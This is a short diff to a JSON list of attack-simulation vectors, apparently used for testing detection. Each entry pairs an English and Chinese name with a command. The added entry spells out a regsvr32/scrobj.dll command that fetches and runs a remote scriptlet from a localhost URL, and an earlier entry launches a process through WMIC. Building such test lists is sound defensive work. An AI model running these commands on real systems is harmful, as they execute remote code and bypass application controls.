@@ -21,7 +21,12 @@
         "vector_name":"WmiExecProc",
         "vector_cn_name":"通过WMIC启动可疑进程",
         "command":"wmic process call create calc"
-    }
+    },
 
+    {
+        "vector_name":"ScrobjRemoteExec",
+        "vector_cn_name":"Scrobj远程脚本执行",
+        "command":"regsvr32 /s /n /u /i:http://127.0.0.1/1.sct scrobj.dll"
+    }
 
 ]
